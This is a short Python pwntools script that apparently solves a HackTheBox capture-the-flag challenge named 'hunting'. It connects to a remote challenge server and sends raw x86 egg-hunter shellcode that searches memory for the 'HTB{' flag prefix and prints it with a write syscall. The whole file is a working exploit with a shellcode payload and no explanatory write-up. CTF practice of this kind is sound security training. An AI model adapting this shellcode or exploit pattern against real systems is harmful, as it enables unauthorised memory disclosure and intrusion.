from pwn import *

# Load Environment
context.terminal = ['tmux','splitw' ,'-h']
elf = ELF("./hunting")
#libc = ELF("./libc.so.6")
#ld_preload = {"LD_PRELOAD": "/home/fresh/libc.so.6"}

p = remote("144.126.232.205", 32582)
#p = process("./hunting")
#p = gdb.debug("./hunting", '''
#break *read
#''')

# HTB{
egg = "\x48\x54\x42\x7b"

# Egg hunt for "HTB{".
# Then SYCALL write() flag.
eh3 = "\xba\x00\x00\x00\x00\x66\x81\xca\xff\x0f\x42\x60\x31\xc9\x8d\x5a\x04\x31\xc0\xb0\x21\xcd\x80\x3c\xf2\x61\x74\xe9\xbf\x48\x54\x42\x7b\x39\x3a\x75\xe5\x89\xd1\x6a\x24\x5a\x6a\x01\x5b\x6a\x04\x58\xcd\x80"

payload = ""
payload += eh3

p.sendline(payload)
p.interactive()

